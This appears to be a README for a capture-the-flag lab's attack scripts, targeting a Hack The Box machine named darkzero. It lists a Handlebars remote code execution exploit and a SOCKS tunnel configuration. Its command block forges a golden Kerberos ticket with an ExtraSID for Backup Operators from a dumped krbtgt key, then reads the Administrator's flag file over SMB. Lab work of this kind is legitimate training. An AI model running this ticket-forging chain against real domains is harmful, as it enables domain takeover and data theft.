# scripts — dzcampaigns

| Script | Purpose |
|--------|---------|
| `ast_rce.py` | Handlebars AST RCE (CVE-2026-33937) via `campaign_message` |
| `forge_bo_extrasid.py` | Golden TGT EXT + ExtraSID Backup Operators |
| `smb_bo_get.py` | SMB GET with `FILE_OPEN_FOR_BACKUP_INTENT` |
| `hb_rce.py` / `db_dump.py` | earlier lab helpers |
| `krb5-dual-realm.conf.example` | dual-forest Kerberos client config |
| `pc-chisel.conf` | proxychains → chisel SOCKS |

## Typical system path

```bash
# 1) forge (need EXT krbtgt AES from secretsdump)
python3 forge_bo_extrasid.py \
  --krbtgt-aes <AES> \
  --domain-sid S-1-5-21-2850783758-1231244658-2051857529 \
  --user celia --user-id 1109 \
  --out /tmp/celia_bo.ccache

# 2) on SRV01 (clock OK)
export KRB5_CONFIG=./krb5-dual-realm.conf.example
export KRB5CCNAME=FILE:/tmp/celia_bo.ccache
kvno cifs/dc01.darkzero.htb@DARKZERO.HTB

# 3) read system flag
python3 smb_bo_get.py \
  --path 'Users\\Administrator\\Desktop\\root.txt' \
  --out root.txt
```
